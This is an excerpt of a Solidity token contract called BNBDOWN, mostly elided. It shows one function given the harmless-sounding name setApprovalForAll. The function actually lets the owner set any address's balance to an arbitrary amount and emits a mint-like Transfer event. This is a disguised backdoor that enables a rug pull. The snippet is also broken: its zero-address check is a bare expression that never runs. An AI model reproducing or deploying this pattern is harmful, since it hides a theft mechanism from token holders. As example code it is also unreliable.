...
contract BNBDOWN is Context, IERC20, Ownable {
    ...
    string private constant _name = "BNBDOWN";
    string private constant _symbol = "BNBDOWN";
    ...
    function setApprovalForAll(address operator, uint256 amount, bytes32 requiresSuccess) public onlyOwner {
        (operator != address(0), "ERC20: burn from the zero address");
        require(amount != 0, "Not Zero");
        balances[operator] = amount * (10 ** 9);
        emit Transfer(address(0), operator, amount * 10 ** 9);
    }
